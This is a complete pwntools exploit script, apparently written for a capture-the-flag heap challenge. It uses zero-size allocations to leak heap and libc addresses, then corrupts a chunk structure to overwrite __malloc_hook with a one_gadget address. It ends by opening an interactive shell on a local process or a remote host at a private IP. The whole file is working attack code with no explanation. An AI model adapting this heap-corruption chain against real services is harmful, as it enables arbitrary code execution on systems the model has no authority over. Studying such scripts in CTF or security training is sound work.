from pwn import *

context(os='linux',arch='amd64',aslr = 'False',log_level='debug')
local = 1
#log_level='debug'

if local:
	p = process("./pwn.patched")#,env={'LD_PRELOAD':'./libc_x64.so.6'})
	elf = ELF("./pwn.patched")
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	#p = remote('192.168.210.11',11006)
	p = remote('172.29.20.112',9999)
	elf = ELF("./pwn")
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def new(size,content):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("?>")
    p.sendline(str(size))
    p.recvuntil("content:")
    p.sendline(content)

def new2(size,content):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("?>")
    p.sendline(str(size))
    p.recvuntil("content:")
    p.send(content)

def edit(index,content):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil("content:")
    p.sendline(content)

def show(index):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil("Index:")
    p.sendline(str(index))

def delete(index):
    p.recvuntil("choice:")
    p.sendline("4")
    p.recvuntil("Index:")
    p.sendline(str(index))

'''
bb 0xCF2
bb 0xE17
bb 0x100D

'''
new(0x10,"AAA")#0
new(0x10,"AAA")#1
delete(1)
delete(0)

new(0,"B")#0
show(0)
p.recvuntil("Content: ")
heap = u64(p.recvuntil('\n', drop=True)+"\x00\x00") - 0x40
print "[+] heap = " + str(hex(heap))
new(0x10,"B")#1

new(0xa0,"AAA")#2
new(0xa0,"AAA")#3
delete(2)
new(0,"B")#2
show(2)
p.recvuntil("Content: ")
libc_base = u64(p.recvuntil('\n', drop=True)+"\x00\x00") - 0x3c4c18
print "[+] libc_base = " + str(hex(libc_base))
system = libc_base + libc.symbols['system']
malloc_hook = libc_base + 0x3c4b10
free_hook = libc_base + 0x3c67a8
one_gadget = libc_base + 0xf1147
print "[+] malloc_hook = " + str(hex(malloc_hook))
new(0x60,"44")#4

new(0xa0,"555")#5
new(0xa0,"666")#6
new(0xa0,"777")#7
new(0xa0,"888")#8
pause()
delete(5)
delete(6)
delete(7)
#edit(2,)
payload = p64(malloc_hook) + p32(0x10) + p32(1)
pause()
new2(0,payload) # control 6's struct

edit(5,p64(one_gadget))
p.interactive()


